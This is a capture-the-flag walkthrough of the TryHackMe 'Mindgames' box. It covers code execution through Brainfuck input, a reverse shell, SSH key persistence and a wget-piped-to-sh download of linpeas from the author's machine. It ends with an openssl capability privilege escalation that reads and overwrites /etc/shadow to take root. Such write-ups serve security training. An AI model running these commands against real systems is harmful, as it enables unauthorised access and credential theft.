This is a writeup for the Box Mindgames on TryHackMe.


We are greeted by this webpage:

[![https://imgur.com/qYX6ZrS.png](https://imgur.com/qYX6ZrS.png)](https://imgur.com/qYX6ZrS.png)


There we can see some weird cryptic characters.

Luckily i saw it before and knew it is brainfuck code.

I used https://copy.sh/brainfuck/text.html to start playing arround with someoutput.

It seems like the code is executed in python so we can try something like a simple ls:

[![https://imgur.com/hBHedq9.png](https://imgur.com/hBHedq9.png)](https://imgur.com/hBHedq9.png)

It works!

[![https://imgur.com/Ix7XilL.png](https://imgur.com/Ix7XilL.png)](https://imgur.com/Ix7XilL.png)

Now lets try to search arround for hints / something interesting.

After searching arround i didn't find anything so i though the best way is to get a reverseshell.
I tried to copy paste one from PayloadsAllTheThings but it didn't work. (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
Took me a few min to realize that i have to adjust it because we don't need to tell the programm to run python we can just start at the import statement:

[![https://imgur.com/nbwFn9z.png](https://imgur.com/nbwFn9z.png)](https://imgur.com/nbwFn9z.png)

Now we are in!

[![https://imgur.com/q5JEsep.png](https://imgur.com/q5JEsep.png)](https://imgur.com/q5JEsep.png)

Lets find the userflag and a way to advance ! 

I found the userflag yaaay i am not going to tell you where but its not hidden.

Next i made a .ssh directory generated ssh keypair with sshkeygen and added the pubkey in the authorized file i created copyed the private key to my host machine and logged into ssh with the -i option for private key.

[![https://imgur.com/hGxHijO.png](https://imgur.com/hGxHijO.png)](https://imgur.com/hGxHijO.png)

Now on my hostmachine i already have linpeas.sh downloaded so i set up a http.server with python:

python3 -m http.server 10000

On the target in the /tmp directory we can get the file now with wget and execute it:

wget http://ip:10000/linpeas.sh | sh

We find something interesting.

[![https://imgur.com/qTykJym.png](https://imgur.com/qTykJym.png)](https://imgur.com/qTykJym.png)

[![https://imgur.com/fG0YCF6.png](https://imgur.com/fG0YCF6.png)](https://imgur.com/fG0YCF6.png)

Check kernel version:

[![https://imgur.com/e40xsCU.png](https://imgur.com/e40xsCU.png)](https://imgur.com/e40xsCU.png)

searchsploit with the kernel version gives us this beauties to check:

[![https://imgur.com/9wYBWI4.png](https://imgur.com/9wYBWI4.png)](https://imgur.com/9wYBWI4.png)

Lets try them out:

You can use searchsploit -m to download:
searchsploit -m linux/local/47164.sh

i renamed it to kernel_exploit.sh and then got it on the target machine with over our http server.

Typicall problems: forget permission and then wrong format..

[![https://imgur.com/8sOrDJc.png](https://imgur.com/8sOrDJc.png)](https://imgur.com/8sOrDJc.png)

Okay this seems to be a dead end..

[![https://imgur.com/ksaBlg1.png](https://imgur.com/ksaBlg1.png)](https://imgur.com/ksaBlg1.png)

Lets look for other ways to proceed!
We found cap_setsuid ! 
[![https://imgur.com/HEP67KP.png](https://imgur.com/HEP67KP.png)](https://imgur.com/HEP67KP.png)

[![https://imgur.com/eWFs7uR.png](https://imgur.com/eWFs7uR.png)](https://imgur.com/eWFs7uR.png) CREDS TO: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities

[![https://imgur.com/zXzZZff.png](https://imgur.com/zXzZZff.png)](https://imgur.com/zXzZZff.png)


Here a short summary taken from the medium article full credits go to him (his name is: Z3R0 ): 

The following part i had to research and i found this awsome medium article about Linux Capabilities and how to use openssl
 with the capability set to ep to get root.

AGAIN CREDIT TO: https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099

Come here again when you fully understood it and give a good summary in own words.

1. So far i understood that you can use openssl to create keys and certificates. -> So we can create a keys and certificates
2. You can also start a server running with openssl. -> We can start a server with that keys and certificates
3. Depending on where you are when you have the capability of ep set on openssl it will inherit the permission from the location. -> We start the server with openssl in the / directory.
That means if you start the server from a low privileged userdirectory you will inherit that permission but if you create it in the / directory the server will inherit root permission.
4. We can access this server with wget or curl from our normal user. -> We can do something like: curl -k "https://127.0.0.1:1337/etc/shadow"
5. Now that we have a copy of the /etc/shadow file we can create our own password hash with openssl and with that we can replace the hash for the root user in the file. -> openssl passwd -6 -salt xyz  yourpass
6. Now we want to overwrite the orginial /etc/shadow file to do that we have to encrypt our new shadowfile otherwise we can't transport it over openssl.
7. Now we can overwrite the original file. -> /openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/privkey.pem -out /etc/shadow
8. We can switch User to root now since we created the new password!


The command for creating a private key and a certificate with openssl is:
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

with the nodes option you avoid giving a passphrase.

Now we start the server in the root directory:

openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP

Now that the server is running we can curl the resource we want!

curl -k "https://127.0.0.1:1337/etc/shadow" ( We could also just curl the root.txt :D )

The reason why need we need -k or --insecure
[![https://imgur.com/7AorKEQ.png](https://imgur.com/7AorKEQ.png)](https://imgur.com/7AorKEQ.png)


